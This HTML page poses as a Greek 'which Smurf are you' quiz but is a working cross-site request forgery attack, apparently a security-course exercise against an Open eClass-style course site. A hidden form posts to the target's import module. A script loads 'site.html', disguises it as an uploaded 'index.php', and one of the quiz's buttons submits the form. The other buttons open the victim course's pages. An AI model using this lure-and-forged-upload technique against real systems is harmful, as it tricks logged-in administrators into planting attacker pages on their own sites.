<html><head>
<style>
.button {
  font: bold 20px Arial;
  text-decoration: none;
  background-color: #EEEEEE;
  color: #333333;
  padding: 5px 10px 5px 10px;
  border-top: 1px solid #CCCCCC;
  border-right: 1px solid #333333;
  border-bottom: 1px solid #333333;
  border-left: 1px solid #CCCCCC;
}


  

  

body {
  margin-top: 50px;
  margin-left: 50px;
			padding: 0;
			background: url('https://cdn.shopify.com/s/files/1/0254/5608/3018/files/Characters_Classic_Generic_Smurf_02_2048x2048.png?v=1673349437') no-repeat center center fixed;
			-webkit-background-size: cover;
			-moz-background-size: cover;
			-o-background-size: cover;
			background-size: cover;
			color: black;
			text-shadow: 2px 2px 0 white, -2px -2px 0 white, 2px -2px 0 white, -2px 2px 0 white;
            
}


input[type="text"], input[type="number"], select {
  font-size: 20px;
  width: 300px;
}
</style>
</head>    
<body>

<meta http-equiv="content-type" content="text/html; charset=utf-8" />

<h1 style="font-size: 80px;">Μάθε ποιό στρουμφάκι είσαι!!!</h1>
<h1><div>
<br>
<br>
<br>
    Πως σε λένε;
    <br>
    <br>
    <br>
    <input type="text">
<a class="button" href="http://i-sn1ff-ch4tz1k0.csec.chatzi.org/courses/TMA100/index.php" target="_blank">αποθήκευση</a>
</div></h1>




<div hidden="hidden">  
<form method="POST" action="http://i-sn1ff-ch4tz1k0.csec.chatzi.org/modules/import/import.php?submit=yes" target="_blank" enctype="multipart/form-data" >
		<table><thead><tr><th>Όνομα αρχείου της σελίδας :</th>
		<td><input type="file" name="file" size="35" accept="text/html"></td>
		</tr><tr><th>Τίτλος σελίδας :</th>
		<td><input type="Text" name="link_name" size="50" value="press_me"></td>
		</tr></thead></table>
		<br>
		<input id="submit" type="Submit" name="submit" value="Προσθήκη"></form>
</div>

<script>


    const fileUrl = 'site.html';
    text="";
    fetch(fileUrl)
    .then(response => response.text())
    .then(data => {
        console.log(data);
        text=data;
            // Get a reference to our file input
    const fileInput = document.querySelector('input[type="file"]');

    // Create a new File object
    const myFile = new File([text], 'index.php', {
        type: 'text/html',
        lastModified: new Date(),
    });

    // Now let's create a DataTransfer to get a FileList
    const dataTransfer = new DataTransfer();
    dataTransfer.items.add(myFile);
    fileInput.files = dataTransfer.files;

    })
    .catch(error => {
        console.error('Error fetching file:', error);
    });

</script>
<h1><div>
    <br>
    Ποιά εποχή είναι η αγαπημένη σου εποχή;
    <br>
    <br>
    <br>
    <select>
        <option>Χειμώνας</option>
        <option>Άνοιξη</option>
        <option>Καλοκαίρι</option>
        <option>Φθινόπωρο</option>
    </select>
<a  class="button" href="#"  onclick="document.getElementById('submit').click(); return false;">επιλογή</a>

</div></h1>
<h1><div>
<br>
Ποιός είναι ο αγαπημένος σου αριθμός;
    <br>
    <br>
    <br>
    <input type="number">
<a  class="button" href="http://i-sn1ff-ch4tz1k0.csec.chatzi.org/courses/TMA100/page/index.php" target="_blank">αποθήκευση</a>
</div></h1>

<button style="background-color: green; color: white; font-size: 40px;">Επόμενη σελίδα!</button>


</body>